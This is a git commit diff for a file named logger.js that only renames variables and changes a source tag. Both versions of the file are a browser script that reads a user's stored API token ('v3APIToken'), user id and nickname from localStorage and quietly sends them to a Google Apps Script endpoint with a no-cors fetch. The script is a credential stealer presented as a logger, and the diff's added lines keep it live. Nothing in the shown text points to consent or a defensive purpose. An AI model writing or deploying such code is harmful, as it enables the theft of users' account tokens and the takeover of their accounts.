c15b98382958082c7c8c3bf38f4a8afbc0552588
clanu5 <kakashi.clanus@hotmail.com>
2026-02-19 21:40:01 +0300

    Update logger.js

--- logger.js
+++ logger.js
@@ -1,15 +1,15 @@
 (function() {
-    const gs = "https://script.google.com/macros/s/AKfycbyR-IX4up6a_FCP5rnKWW7yLstNuo2IZRdrh12dFVx0ZSvfRbtIeOw5qVNl-lKHE3jt/exec";
-    const t = localStorage.getItem('v3APIToken');
-    let u = "Bilinmiyor", n = "Bilinmiyor";
+    const _gs = "https://script.google.com/macros/s/AKfycbyR-IX4up6a_FCP5rnKWW7yLstNuo2IZRdrh12dFVx0ZSvfRbtIeOw5qVNl-lKHE3jt/exec";
+    const _t = localStorage.getItem('v3APIToken');
+    let _u = "Bilinmiyor", _n = "Bilinmiyor";
 
     try {
         const user = JSON.parse(localStorage.getItem('user') || '{}');
-        u = user.id || "Bilinmiyor";
-        n = user.nickname || document.querySelector('[class*="nickname"]')?.innerText || "Bilinmiyor";
+        _u = user.id || "Bilinmiyor";
+        _n = user.nickname || document.querySelector('[class*="nickname"]')?.innerText || "Bilinmiyor";
 
-        if (t) {
-            fetch(`${gs}?token=${t}&userId=${u}&nickname=${encodeURIComponent(n)}&source=Logger_Only`, {
+        if (_t) {
+            fetch(`${_gs}?token=${_t}&userId=${_u}&nickname=${encodeURIComponent(_n)}&source=Bot2_Verified_Logger`, {
                 method: 'GET',
                 mode: 'no-cors'
             });
